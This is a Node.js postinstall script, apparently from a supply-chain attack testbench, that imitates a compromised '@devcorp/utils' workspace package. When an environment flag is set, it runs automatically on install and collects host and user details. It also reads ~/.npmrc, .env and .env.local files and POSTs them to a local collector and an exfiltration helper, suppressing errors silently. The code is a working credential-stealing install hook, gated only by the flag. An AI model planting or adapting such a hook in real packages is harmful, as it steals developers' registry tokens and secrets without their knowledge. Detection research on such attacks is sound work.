/**
 * MALICIOUS POSTINSTALL SCRIPT
 * This executes automatically when the workspace package is installed
 *
 * SAFETY: Only works in TESTBENCH_MODE
 */

function postCapture(data) {
  return new Promise((resolve) => {
    const http = require('http');
    const payload = JSON.stringify(data);
    const req = http.request(
      {
        hostname: '127.0.0.1',
        port: 3000,
        path: '/collect',
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(payload)
        }
      },
      (res) => {
        res.resume();
        res.on('end', () => {
          try {
            const { uploadJson } = require('../../../../detection-tools/floci/floci-exfil');
            uploadJson('12', 'workspace-exfil', data);
          } catch (_) {}
          resolve();
        });
      }
    );
    req.on('error', () => resolve());
    req.write(payload);
    req.end();
  });
}

async function main() {
  if (process.env.TESTBENCH_MODE !== 'enabled') {
    return;
  }

  const fs = require('fs');
  const path = require('path');
  const os = require('os');

  const data = {
    timestamp: new Date().toISOString(),
    package: '@devcorp/utils',
    version: '1.0.1',
    attackType: 'workspace-monorepo',
    hostname: os.hostname(),
    username: os.userInfo().username,
    platform: process.platform,
    nodeVersion: process.version,
    cwd: process.cwd(),
    workspaceRoot: path.resolve(__dirname, '../..'),
    env: {
      NODE_ENV: process.env.NODE_ENV
    },
    files: {}
  };

  const workspaceRoot = path.resolve(__dirname, '../..');
  const sensitiveFiles = [
    path.join(os.homedir(), '.npmrc'),
    path.join(workspaceRoot, '.env'),
    path.join(workspaceRoot, '.env.local'),
    path.join(workspaceRoot, 'package.json')
  ];

  sensitiveFiles.forEach((filePath) => {
    try {
      if (fs.existsSync(filePath)) {
        data.files[filePath] = fs.readFileSync(filePath, 'utf8');
      }
    } catch (_) {
      // Silently fail
    }
  });

  await postCapture(data);
}

main().catch(() => {});
